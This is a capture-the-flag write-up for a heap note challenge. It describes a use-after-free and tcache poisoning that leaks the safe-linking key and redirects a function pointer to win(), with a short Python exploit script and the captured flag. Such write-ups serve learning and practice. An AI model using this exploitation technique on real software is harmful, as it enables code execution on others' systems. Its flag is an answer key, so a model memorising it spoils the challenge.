# Writeup

## Overview
A classic note heap challenge: create / edit / delete / show, `MAX_NOTE=4`, chunk size `0x20`. There's a `win()` that reads `flag.txt`, and a global function pointer `state.finalizer` that `main()` calls right before returning. Normally it's `normal_exit`; we want to point it at `win()`.

## Vuln
Two problems in the note handling:
- `delete_note()` frees the chunk but leaves `notes[index].data` dangling (only flips `is_used`).
- `edit_note()` / `show_note()` don't check `is_used`, so we can **read and write a freed chunk** → UAF, which gives us tcache poisoning.

glibc here uses **safe-linking**, so the tcache `next` pointer is XORed with a key (`chunk_addr >> 12`). We need to leak that key first.

## Exploit
Plan: tcache poisoning to allocate a chunk on top of `state`, then overwrite `state.finalizer` with `win`.

1. `create()` two notes (0 and 1).
2. `delete(0)` → chunk A goes to tcache. Now `show()` prints A's data, which is the **encoded `next` pointer** = the safe-linking key (A is the only entry, so `next` encodes NULL and leaks the key).
3. `delete(1)` → tcache is now B → A.
4. `edit(1, ...)` (UAF write on freed B) → set B's `next` to `state ^ key`. tcache head is B, next is `state`.
5. `create()` (reuses B), `create()` again → this second chunk is placed at `state`.
6. `edit(1, p64(win))` → overwrite `state.finalizer` with `win`.
7. Send an invalid command (`0`) → `main` exits via `state.finalizer()` → `win()` → prints the flag.

```python
create(); create()          # notes[0]=A, notes[1]=B
delete(0)                    # A -> tcache
key = u64(show_leak())       # safe-linking key from A's encoded next
delete(1)                    # tcache: B -> A
edit(1, p64(state ^ key).ljust(0x20, b"\x00"))   # poison B.next -> state
create(); create()           # 2nd alloc lands on state
edit(1, p64(win).ljust(0x20, b"\x00"))           # state.finalizer = win
command(0)                   # default case -> state.finalizer() == win()
```

## flag
```
flag{9f2c8a7e1b4d6f30c5a8e2d7b1f9c}
```
